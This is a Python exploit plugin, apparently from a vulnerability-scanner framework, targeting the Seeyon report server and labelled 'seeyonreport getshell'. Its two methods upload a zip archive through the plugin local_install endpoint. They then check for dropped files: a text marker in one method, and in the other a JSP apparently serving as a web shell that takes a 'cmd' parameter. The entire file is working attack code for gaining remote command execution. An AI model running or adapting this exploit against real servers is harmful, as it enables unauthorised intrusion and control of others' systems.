#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import aiohttp
from lib.core.data import paths
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2019-3396'
        self.keyword = ['seeyonreport','seeyon']
        self.info = 'seeyonreport getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'seeyonreport/ReportServer?op=plugin&cmd=local_install'
                form = aiohttp.FormData()
                form.add_field('file', open(os.path.join(paths.TOOL_PATH,'seeyon_bak.zip'),'rb'), filename='1.zip', content_type='text/plain')
                async with session.post(url=url, data=form) as res:
                    if res!=None and res.status ==200:
                        url1 = self.base_url + 'seeyonreport/bak.txt'
                        async with session.get(url=url1) as res1:
                            if res1 != None and res1.status == 200:
                                text = await res1.text()
                                if 'This is a bak file' in text:
                                    self.flag = 1
                                    self.res.append({"info": url1, "key": res1.text})

    async def upload(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'seeyonreport/ReportServer?op=plugin&cmd=local_install'
                form = aiohttp.FormData()
                form.add_field('file', open(os.path.join(paths.TOOL_PATH,'seeyon_bak.zip'),'rb'), filename='1.zip', content_type='text/plain')
                async with session.post(url=url, data=form) as res:
                    if res!=None and res.status ==200:
                        url1 = self.base_url + 'seeyonreport/test_bak.jsp'
                        async with session.get(url=url1) as res1:
                            if res1 != None and res1.status == 200:
                                text = await res1.text()
                                if 'This is a bak file' in text:
                                    self.flag = 1
                                    self.res.append({"info": url1, "key": 'cmd=ls'})